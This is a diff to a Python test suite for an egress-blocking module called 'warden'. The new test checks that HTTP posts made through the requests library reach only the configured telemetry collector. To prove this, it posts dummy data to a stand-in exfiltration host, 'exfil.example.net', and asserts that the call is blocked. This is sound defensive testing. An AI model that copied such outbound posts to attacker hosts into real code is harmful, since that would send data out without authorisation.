@@ -393,3 +393,30 @@ def test_aws_service_endpoints_are_looked_up_and_the_news_feeds_are_read():
         egress.check_request(feed, None, {"User-Agent": "warden"}, "GET")
     assert egress.destination_of("aws.amazon.com").name == "aws-news"
     assert egress.destination_of("evil.amazon.com") is None
+
+
+_REQUESTS = textwrap.dedent("""
+    import os, sys
+    os.environ["OTEL_EXPORTER_OTLP_ENDPOINT"] = "https://otlp.collector.example"
+    os.environ.pop("HTTPS_PROXY", None); os.environ.pop("https_proxy", None)
+    import requests
+    from warden import egress
+    egress.install()
+    for host in ("otlp.collector.example", "exfil.example.net"):
+        try:
+            requests.post("https://" + host + "/v1/traces", data=b"spans", timeout=2)
+        except Exception as exc:
+            chain, e = [], exc
+            while e is not None and len(chain) < 10:
+                chain.append(type(e).__name__); e = e.__cause__ or e.__context__
+            print(host, "EgressBlocked" in chain)
+""")
+
+
+def test_a_client_other_than_urllib_is_held_by_the_name_lookup():
+    """The OTLP exporter sends with `requests` since opentelemetry 1.45.1 (#126): no urllib event, so the name lookup
+    is its guard - the configured collector may be looked up, any other host is refused before it is resolved."""
+    got = subprocess.run([sys.executable, "-c", _REQUESTS], capture_output=True, text=True, timeout=60, check=True)
+    lines = dict(line.split() for line in got.stdout.strip().splitlines())
+    assert lines["otlp.collector.example"] == "False"  # looked up (and then unreachable here), not refused
+    assert lines["exfil.example.net"] == "True"
